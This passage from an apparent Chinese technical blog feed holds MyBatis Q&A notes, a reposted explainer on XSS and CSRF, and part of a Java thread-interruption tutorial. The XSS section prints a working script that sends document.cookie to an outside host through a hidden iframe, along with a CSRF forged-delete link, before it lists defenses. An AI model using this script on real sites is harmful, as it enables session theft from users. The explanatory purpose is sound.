sqlsession.getmapper(namemapper<span class="class">.<span class="keyword">class</span>)</span>; </span><br><span class="line">  <span class="keyword">for</span> (string name : names) &#123; </span><br><span class="line">    mapper.insertname(name); </span><br><span class="line">  &#125; </span><br><span class="line">  sqlsession.commit(); </span><br><span class="line">&#125; <span class="keyword">finally</span> &#123; </span><br><span class="line">  sqlsession.close(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如何获取自动生成的（主）键值？<br />答：insert方法总是返回一个int值，这个值代表的是插入的行数。而自动生成的键值在insert方法执行完后可以被设置到传入的参数对象中。示例：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span> <span class="attr">useGeneratedkeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into name (name) values (#&#123;name&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">name name = new name();</span><br><span class="line">name.setName("fred");</span><br><span class="line"></span><br><span class="line">int rows = mapper.insertname(name);</span><br><span class="line">System.out.println("row inserted=" + rows);</span><br><span class="line">System.out.println("generated key value=" + name.getId());</span><br></pre></td></tr></table></figure></li><li><p>在mapper中如何传递多个参数？<br />第一种：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Dao层的函数</span><br><span class="line">public selectUser(String name, String area);</span><br><span class="line"></span><br><span class="line"># 对应的xml，#&#123;0&#125;代表接收的是dao层的第一个参数，#&#123;1&#125;代表dao层中第二个参数，更多参数一致往后即可。</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">  select * from user_user_t where user_name=#&#123;0&#125; and user_area=#&#123;1&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种：</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用@param注解</span><br><span class="line">import org.apache.ibatis.annotations.param;</span><br><span class="line"></span><br><span class="line">public interface userMapper(user selectUser(@param("userName") String userName, @param("hashedPassword") String hashedPassword));</span><br><span class="line"></span><br><span class="line"># 然后就可以在xml像下面这样使用（推荐封装为一个map，作为单个参数传递个mapper）</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">  select id, username, hashedPassword from some_table where userName=#&#123;userName&#125; and hashedPassword=#&#123;hashedPassword&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Mybatis动态sql是做什么？都有哪些动态sql？能简述一下动态sql的执行原理不？<br />答：Mybatis的动态sql可以让我们在xml映射文件内，以标签形式编写动态sql，完成逻辑判断和动态拼接sql的功能。<br />Mybatis提供了9种动态sql标签：trim|where|set|foreach|if|choose|when|otherwise|bind<br />其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此来完成动态sql的功能。</p></li><li><p>Mybatis的xml映射文件中，不同的xml映射文件，id是否可以重复？<br />答：不同的xml映射文件，如果配置了namespace，那么id可以重复；如果没有配置namespace，那么id不能重复；毕竟namespace不是必须的，只是最佳实践而已。<br />原因就是namespace+id是作为Map&lt;String, MappedStatement&gt;的key使用的，如果没有namespace，就剩下id，那么，id重复会导致数据相互覆盖。有了namespace，自然id就可以重复，namespace不同，namespace+id自然也就不同。</p></li><li><p>为什么说Mybatis是半自动的ORM映射工具？它与全自动的区别在哪里？<br />答：Hibernate属于全自动ORM映射工具，使用Hibernate查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。<br />Mybatis在查询关联对象或关联集合对象时，需要手动编写sql来完成，所以，称之为半自动ORM映射工具。</p></li><li><p>一对一、一对多的关联查询？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.lcb.mapping.userMapper"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--association 一对一关联查询--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap"</span>&gt;</span></span><br><span class="line">    select * from class c, teacher t where c.teacher_id=t.id and c.c_id=#&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--实体类的字段名和数据表的字段名映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--collection 一对多关联查询--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass2"</span> <span class="attr">parameter</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span></span><br><span class="line">    select * from class c, teacher t, student s where c.teacher_id=t.t_id and c.c_id=s.class_id and c.c_id=#&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"student"</span> <span class="attr">ofType</span>=<span class="string">"com.lcb.user.Student"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"s_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"s_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> Java Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Java Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF</title>
      <link href="/xss-and-csrf/"/>
      <url>/xss-and-csrf/</url>
      
        <content type="html"><![CDATA[<p><em>以下内容全部来自于转载</em></p><h2 id="xss和csrf的介绍"><a class="markdownIt-Anchor" href="#xss和csrf的介绍"></a> XSS和CSRF的介绍</h2><p>XSS：通过客户端脚本语言（最常见是JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那就叫做XSS！</p><p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）完成一些违背用户意愿的请求（如恶意发帖、删帖、改密码、发邮件等）。</p><p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</p><p>XSS更偏向与代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p><p>场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    alert(<span class="string">'你关不掉我'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。<br />那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>此段代码携带着cookie信息传输给了不安全的服务器，然后服务器接受到了用户的隐私消息，继而继续做其他的业务处理。</p><p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p><p>那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：</p><p>一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 <a href="http://csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; 那么，我只需要在论坛中发一帖，包含一链接：<a href="http://www.csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">www.csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！</p><h2 id="xss与csrf的防范"><a class="markdownIt-Anchor" href="#xss与csrf的防范"></a> XSS与CSRF的防范</h2><p>CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。前者主要由前端与后端合力完成，后者的话通常就是由前端单独去完成的。</p><p>理论上只要有输入数据入口的地方，XSS漏洞就会存在，js代码可以由各种各样的模式注入到数据库中（明文或者编码），所以在中小项目中我们先明确一个意识即可，我们开发人员要有安全处理的意识，不求百分百的过滤掉非法字符，但是基本的，常见的过滤掉即可，剩下的就交给安全工程师去做吧。</p><p>中心思想：一切的一切外部来源数据，毕竟经过我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤，尤其是WEB端。（毕竟各种js防不胜防）。</p><p><strong>通用的补充性防御手段</strong></p><ol><li><p>在输出html时，加上Content Security Policy的Http Header<br />作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等<br />缺陷：IE或低版本的浏览器可能不支持</p></li><li><p>在设置Cookie时，加上HttpOnly参数<br />作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6<br />缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全</p></li><li><p>在开发API时，检验请求的Referer参数<br />作用：可以在一定程度上防止CSRF攻击<br />缺陷：IE或低版本的浏览器中，Referer参数可以被伪造</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程总结</title>
      <link href="/java-concurrent-summary/"/>
      <url>/java-concurrent-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="可重入内置锁"><a class="markdownIt-Anchor" href="#可重入内置锁"></a> 可重入内置锁</h2><p>同一个线程在调用本类中其他synchronized方法/块或父类中的synchronized方法/块时，都不会阻碍该线程地执行，因为互斥锁时可重入的。</p><h2 id="中断线程"><a class="markdownIt-Anchor" href="#中断线程"></a> 中断线程</h2><h3 id="使用interrupt中断线程"><a class="markdownIt-Anchor" href="#使用interrupt中断线程"></a> 使用interrupt()中断线程</h3><p>当一个线程运行时，另一个线程可以调用对应的Thread对象的interrupt()方法中断它。该方法只是在目标线程中设置了一个标志位，表示它已经被中断，并立即返回。<code>如果只是单纯的调用interrupt()方法，线程并没有实际中断，会继续执行。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SleepInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - about to sleep for 20 seconds"</span>);</span><br><span class="line">            Thread.sleep(<span class="number">20000</span>);</span><br><span class="line">            System.out.println(<span class="string">"in run() - woke up"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - interrupted while sleeping"</span>);</span><br><span class="line">            <span class="comment">//处理完中断异常后，返回到run（）方法人口，</span></span><br><span class="line">            <span class="comment">//如果没有return，线程不会实际被中断，它会继续打印下面的信息</span></span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in run() - leaving normally"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SleepInterrupt si = <span class="keyword">new</span> SleepInterrupt();</span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(si);</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="comment">//主线程休眠2秒，从而确保刚才启动的线程有机会执行一段时间</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>); </span><br><span class="line">        &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in main() - interrupting other thread"</span>);</span><br><span class="line">        <span class="comment">//中断线程t</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"in main() - leaving"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203100807812.jpg" alt="" /></p><p>主线程启动新线程后，自身休眠2秒钟，允许新线程获得运行时间。新线程打印信息“about to sleep for 20 seconds”后，继而休眠20秒钟，大约2秒钟后，main线程通知新线程中断，那么新线程的20秒的休眠将被打断，从而抛出InterruptException异常，执行跳转到catch块，打印出“interrupted while sleeping”信息，并立即从run（）方法返回，然后消亡，而不会打印出catch块后面的“leaving normally”信息。<br /><strong>注意：如果将catch块中的return语句注释掉，则线程在抛出异常后，会继续执行，而不会中断，从而打印出”leaving normally“信息。</strong></p><h3 id="待决中断"><a class="markdownIt-Anchor" href="#待决中断"></a> 待决中断</h3><p>上面的例子中断是在sleep()方法之后调用的，它会相当友好地终止线程，并抛出InterruptedException异常。如果在调用sleep()方法前被中断，则该中断被称为<code>待决中断</code>，它会在调用sleep()方法时，立即出InterruptedException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PendingInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果输入了参数，则在mian线程中中断当前线程（亦即main线程）</span></span><br><span class="line">        <span class="keyword">if</span> (args.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//获取当前时间</span></span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算中间代码执行的时间</span></span><br><span class="line">        System.out.println(<span class="string">"elapsedTime="</span> + (System.currentTimeMillis() - startTime));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203104020671.jpg" alt="" /></p><h3 id="使用isinterrupted方法判断中断状态"><a class="markdownIt-Anchor" href="#使用isinterrupted方法判断中断状态"></a> 使用isInterrupted()方法判断中断状态</h3><p>可以在Thread对象上调用isInterrupted()方法来检查任何线程的中断状态。这里需要注意：线程一旦被中断，isInterrupted()方法便会返回true，而一旦sleep()方法抛出异常，它将清空中断标志，此时isInterrupted()方法将返回false。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptCheck</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread t = Thread.currentThread();</span><br><span class="line">        System.out.println(<span class="string">"Point A: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        <span class="comment">//待决中断，中断自身</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"Point B: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        System.out.println(<span class="string">"Point C: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( InterruptedException x) &#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//抛出异常后，会清除中断标志，这里会返回false</span></span><br><span class="line">        System.out.println(<span class="string">"Point D: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203112444531.jpg" alt="" /></p><h3 id="使用threadinterrupted方法判断中断标志位"><a class="markdownIt-Anchor" href="#使用threadinterrupted方法判断中断标志位"></a> 使用Thread.interrupted()方法判断中断标志位</h3><p>可以使用Thread.interrupted()方法来检查当前线程的中断状态(并隐式重置为false)，由于该方法是静态方法，因此不能在特定的线程下使用，而只能报告调用它的线程的中断状态，如果线程被中断，而且中断状态尚不清楚，那么，这个方法返回true。与isInterrupted()不同，它将自动重置中断状态为false，第二次调用Thread.interrupted()方法，总是返回false，除非中断了线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptReset</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point X: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Y: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Z: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203142219015.jpg" alt="" /></p><p><strong>补充：</strong></p><ul><li>join()方法用线程对象调用，如果一个线程A中调用另一个线程B的join方法，线程A会等待线程B执行完毕后再执行。</li><li>yield方法直接使用Thread类调用，yield让出CPU执行权限，再重新竞争CPU的执行权，如果没有比它优先级高的线程，则依旧不会有变化。</li></ul><h2 id="线程挂起-恢复与终止的方法"><a class="markdownIt-Anchor" href="#线程挂起-恢复与终止的方法"></a> 线程挂起、恢复与终止的方法</h2><p><a href="http://www.importnew.com/20539.html" target="_blank" rel="noopener">Java并发编程（3）：线程挂起、恢复与终止的正确方法（含代码）</a></p><h2 id="守护线程与线程阻塞"><a class="markdownIt-Anchor" href="#守护线程与线程阻塞"></a> 守护线程与线程阻塞</h2><ol><li><p>守护线程<br /><strong>注意：</strong></p><ol><li>setDaemon(true)必须在调用线程的start()方法之前设置，否则会跑出IllegalThreadStateException异常。</li><li>在守护线程中产生的新线程也是守护线程。</li><li>不要认为所有的应用都可以分配给守护线程来进行服务，比如读写操作或者计算逻辑。</li></ol></li><li><p>线程阻塞<br /><img src="https://upload-images.jianshu.io/upload_images/4470227-ab4c376926c90157.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线程阻塞的情况" /></p></li></ol><p><strong>注意：不是所有的阻塞都是可中断的，以上阻塞状态的前两种可中断，后面两张不可以中断。</strong></p><h2 id="volatile变量修饰符"><a class="markdownIt-Anchor" href="#volatile变量修饰符"></a> 